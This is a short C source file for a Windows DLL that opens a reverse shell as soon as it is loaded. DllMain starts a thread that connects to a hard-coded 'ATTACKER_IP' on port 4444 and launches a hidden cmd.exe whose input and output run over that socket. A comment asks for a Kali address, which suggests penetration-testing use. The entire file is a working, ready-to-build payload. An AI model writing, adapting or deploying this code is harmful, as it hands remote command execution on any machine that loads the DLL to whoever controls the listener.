#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

// Replace with your Kali IP and port
#define ATTACKER_IP "192.168.147.128"
#define ATTACKER_PORT 4444

void ReverseShell() {
    WSADATA wsaData;
    SOCKET sock;
    sockaddr_in server;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    // 1. Initialize Winsock
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
        return;

    // 2. Create Socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET)
        return;

    // 3. Configure connection
    server.sin_family = AF_INET;
    server.sin_port = htons(ATTACKER_PORT);
    inet_pton(AF_INET, ATTACKER_IP, &server.sin_addr);

    // 4. Connect to the attacker
    if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR)
        return;

    // 5. Prepare STARTUPINFO to redirect I/O
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    si.wShowWindow = SW_HIDE;

    // 6. Launch cmd.exe
    CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReverseShell, NULL, 0, NULL);
            break;
    }
    return TRUE;
}
